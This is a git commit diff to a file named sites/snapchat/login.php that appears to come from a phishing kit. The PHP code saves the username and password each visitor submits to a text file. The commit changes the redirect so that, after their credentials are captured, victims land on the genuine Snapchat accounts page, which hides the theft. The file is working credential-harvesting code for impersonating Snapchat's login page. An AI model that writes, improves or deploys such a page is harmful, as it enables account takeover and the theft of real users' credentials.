bae911e0739fc97ab266aa675933c3c3a3c8e9db
Suami Monday <136092956+cosmicsuami@users.noreply.github.com>
2024-11-28 19:00:01 +0100

    Update login.php

--- sites/snapchat/login.php
+++ sites/snapchat/login.php
@@ -1,5 +1,5 @@
 <?php
 
 file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://docs.google.com/document/d/1ngV-OyQuhQ9cx3DFY-jF51Jqdy4RKU3iGbntYQbWMxc/edit?usp=sharing');
+header('Location: https://accounts.snapchat.com');
 exit();
